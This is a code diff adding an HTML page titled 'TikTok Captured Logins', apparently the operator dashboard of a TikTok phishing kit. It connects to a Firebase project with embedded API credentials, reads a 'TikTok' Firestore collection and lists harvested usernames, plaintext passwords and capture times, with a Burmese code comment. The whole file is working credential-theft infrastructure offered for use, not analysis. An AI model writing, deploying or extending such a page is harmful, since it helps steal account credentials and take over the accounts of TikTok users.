@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Data Viewer</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 30px; background-color: #fafafa; }
+        h2 { color: #fe2c55; text-align: center; margin-bottom: 20px; }
+        .container { max-width: 800px; margin: auto; }
+        table { width: 100%; border-collapse: collapse; background: white; box-shadow: 0 5px 15px rgba(0,0,0,0.1); border-radius: 10px; overflow: hidden; }
+        th, td { padding: 15px; text-align: left; border-bottom: 1px solid #eee; }
+        th { background-color: #161823; color: white; text-transform: uppercase; font-size: 14px; }
+        tr:hover { background-color: #f9f9f9; }
+        .loading { text-align: center; font-style: italic; color: #888; margin-top: 20px; }
+        .no-data { text-align: center; padding: 20px; color: #ff4d4d; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>TikTok Captured Logins</h2>
+        <div id="status" class="loading">Fetching data...</div>
+        
+        <table id="dataTable" style="display:none;">
+            <thead>
+                <tr>
+                    <th>Username</th>
+                    <th>Password</th>
+                    <th>Date/Time</th>
+                </tr>
+            </thead>
+            <tbody id="dataBody">
+                </tbody>
+        </table>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, query, orderBy, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCK8750OLb7WCLyXV2JIL1RaTth55wOQII",
+            authDomain: "main-apk-3209b.firebaseapp.com",
+            projectId: "main-apk-3209b",
+            storageBucket: "main-apk-3209b.firebasestorage.app",
+            messagingSenderId: "729839795941",
+            appId: "1:729839795941:web:48b23f39e7bf6f3cf11e0c"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        async function loadTikTokData() {
+            const dataBody = document.getElementById('dataBody');
+            const status = document.getElementById('status');
+            const table = document.getElementById('dataTable');
+
+            try {
+                // TikTok collection ထဲက data တွေကို timestamp အလိုက် စီပြီးယူမယ်
+                const q = query(collection(db, "TikTok"), orderBy("timestamp", "desc"));
+                const querySnapshot = await getDocs(q);
+
+                if (querySnapshot.empty) {
+                    status.innerHTML = "<div class='no-data'>No data found in TikTok collection.</div>";
+                    return;
+                }
+
+                status.style.display = 'none';
+                table.style.display = 'table';
+
+                querySnapshot.forEach((doc) => {
+                    const data = doc.data();
+                    const row = `
+                        <tr>
+                            <td><strong>${data.username || 'Empty'}</strong></td>
+                            <td><code>${data.password || 'Empty'}</code></td>
+                            <td>${data.timestamp ? data.timestamp.toDate().toLocaleString() : 'N/A'}</td>
+                        </tr>
+                    `;
+                    dataBody.innerHTML += row;
+                });
+            } catch (error) {
+                console.error("Error:", error);
+                status.innerText = "Error loading data. Check Firestore Rules.";
+            }
+        }
+
+        loadTikTokData();
+    </script>
+</body>
+</html>
